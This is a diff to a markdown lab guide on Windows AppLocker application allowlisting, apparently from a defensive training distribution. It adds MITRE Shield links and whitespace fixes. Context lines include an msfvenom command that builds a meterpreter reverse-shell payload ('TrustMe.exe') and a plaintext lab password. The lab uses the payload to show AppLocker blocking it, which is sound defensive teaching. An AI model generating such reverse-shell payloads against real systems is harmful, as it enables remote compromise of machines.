@@ -1,6 +1,15 @@
 
 # AppLocker
 
+MITRE Shield
+------------
+
+Applicable MITRE Shield techniques:
+* [DTE0036](https://shield.mitre.org/techniques/DTE0036) - Software Manipulation
+* [DTE0032](https://shield.mitre.org/techniques/DTE0032) - Security Controls
+
+Instructions
+------------
 
 Applocker Instructions:
 
@@ -26,7 +35,7 @@ $`ifconfig`
 
 ![](attachments\Clipboard_2020-06-12-12-35-15.png)
 
-Please note the IP address of your Ethernet adapter.  
+Please note the IP address of your Ethernet adapter.
 
 
 
@@ -36,12 +45,12 @@ Please note your IP address for the ADHD Linux system on a piece of paper:
 
 
 
-Now, run the following commands to start a simple backdoor and backdoor listener: 
+Now, run the following commands to start a simple backdoor and backdoor listener:
 
 $ `sudo su -`
 Please note, the adhd password is adhd.
 
-/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
+/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444
 -f exe -o /tmp/TrustMe.exe`
 
 /#`cd /tmp`
@@ -116,7 +125,7 @@ Please select each of the above Rule groups (Executable, Windows Installer, Scri
 
 ![](attachments\Clipboard_2020-06-12-12-59-57.png)
 
-This should generate a subset of rules for each group.  It should look similar to how it does below: 
+This should generate a subset of rules for each group.  It should look similar to how it does below:
 
 
 ![](attachments\Clipboard_2020-06-12-13-00-24.png)
@@ -139,7 +148,7 @@ Once the Application Identity Properties dialog is open, please press the Start 
 ![](attachments\Clipboard_2020-06-12-13-01-27.png)
 
 
-Next, log out as ADHD and log back in as allowlist.  
+Next, log out as ADHD and log back in as allowlist.
 
 You can do this easily by selecting the Windows icon and then the little wite user icon:
 
